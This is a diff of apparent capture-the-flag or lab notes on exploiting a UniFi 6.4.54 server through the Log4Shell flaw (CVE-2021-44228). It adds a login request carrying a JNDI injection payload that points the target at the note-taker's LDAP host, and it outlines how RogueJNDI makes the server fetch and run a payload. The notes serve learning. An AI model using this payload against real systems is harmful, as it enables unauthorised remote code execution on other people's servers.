@@ -181,9 +181,27 @@ https://{IP_ADDRESS:8443
 ->unifi website 6.4.54, has an exploit, vulnerable to log4j rce attack CVE-2021-44228 (log4shell)
 
 -> we can use burp suite to try to make an ldap connection and see if its vulnerable by using tcpdump on port 
-The field is vulnerable to JNDI injection
-The target has network access back to you
-You’re using the right interface/IP
+
+```bash
+
+```
+
+-> then send a ldap connection request payload from burp suite
+
+```json
+{
+"username":"wdasd",
+  "password":"wwdasd",
+  "remember":"${jndi:ldap://10.10.14.95:1389/o=tomcat}",
+ "strict":true
+}
+```
+
+-> after verifying the logs, then we can try to set a tool to exploit Java Naming and Directory Interface (JNDI) injection vulnerabilities
+
+- makes a dual server, malicious LDAP and HTTP, makes LDAP endpoint URLs and map them to a specific exploit technique for different vers and envs (tomcat, websphere, groovy)
+- vulnerable java app do a JNDI lookup on the generated LDAP URLs, RogueJNDI responds with a malicious reference or serialized object, and tricks server to fetch and executing the payload
+
 
 Getting from callback → RCE
 
